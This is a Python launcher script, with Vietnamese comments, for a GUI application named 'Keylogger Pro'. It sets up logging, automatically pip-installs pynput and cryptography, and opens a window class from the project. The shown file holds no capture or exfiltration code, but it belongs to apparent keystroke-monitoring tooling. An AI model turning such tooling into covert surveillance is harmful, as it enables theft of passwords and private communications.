#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
Điểm khởi đầu của ứng dụng Keylogger
"""

import os
import sys
import logging
import tkinter as tk
import subprocess

# Đảm bảo thư mục gốc của ứng dụng được thêm vào PATH
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

# Thiết lập logging
def setup_logging():
    """Thiết lập cấu hình logging cho ứng dụng."""
    log_dir = os.path.join(os.path.expanduser("~"), ".keylogger")
    os.makedirs(log_dir, exist_ok=True)

    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
        filename=os.path.join(log_dir, "app.log"),
        filemode="a",
    )
    return logging.getLogger("keylogger")

# Kiểm tra và cài đặt thư viện UI
def check_and_install_ui_libs():
    """Kiểm tra và cài đặt các thư viện UI cần thiết."""
    try:
        import ttkbootstrap
        import customtkinter
        from PIL import Image, ImageTk
        return True
    except ImportError:
        print("Cài đặt thư viện giao diện...")
        try:
            subprocess.check_call(
                [
                    sys.executable,
                    "-m",
                    "pip",
                    "install",
                    "ttkbootstrap",
                    "customtkinter",
                    "pillow",
                ]
            )
            print("Đã cài đặt thư viện. Vui lòng khởi động lại ứng dụng.")
            return False
        except Exception as e:
            print(f"Lỗi khi cài đặt thư viện: {e}")
            return False

# Kiểm tra các thư viện cần thiết khác
def check_required_packages():
    """Kiểm tra các thư viện bắt buộc khác."""
    required_packages = {
        "pynput": "pynput",
        "cryptography": "cryptography",
    }
    
    missing_packages = []
    for package, module in required_packages.items():
        try:
            __import__(module)
        except ImportError:
            missing_packages.append(package)
    
    if missing_packages:
        print(f"Đang cài đặt các thư viện cần thiết: {', '.join(missing_packages)}")
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install"] + missing_packages)
            print("Đã cài đặt thư viện. Khởi động ứng dụng...")
        except Exception as e:
            print(f"Lỗi khi cài đặt thư viện: {e}")
            return False
    
    return True

def main():
    """Hàm chính khởi động ứng dụng."""
    logger = setup_logging()
    logger.info("Khởi động ứng dụng")
    
    # Kiểm tra thư viện
    if not check_and_install_ui_libs():
        sys.exit(1)
    
    if not check_required_packages():
        sys.exit(1)
    
    # Import sau khi đã kiểm tra thư viện
    try:
        import ttkbootstrap as ttk
        from gui.app import ModernKeyloggerApp
        
        # Khởi tạo ứng dụng
        root = ttk.Window(themename="lumen", title="Keylogger Pro")
        app = ModernKeyloggerApp(root)
        root.mainloop()
    except Exception as e:
        logger.error(f"Lỗi khi khởi động ứng dụng: {e}")
        # Fallback nếu không có ttkbootstrap
        try:
            root = tk.Tk()
            root.title("Keylogger Pro")
            
            from gui.app import ModernKeyloggerApp
            app = ModernKeyloggerApp(root)
            root.mainloop()
        except Exception as e:
            logger.error(f"Lỗi nghiêm trọng: {e}")
            print(f"Lỗi nghiêm trọng khi khởi động ứng dụng: {e}")
            sys.exit(1)

if __name__ == "__main__":
    main()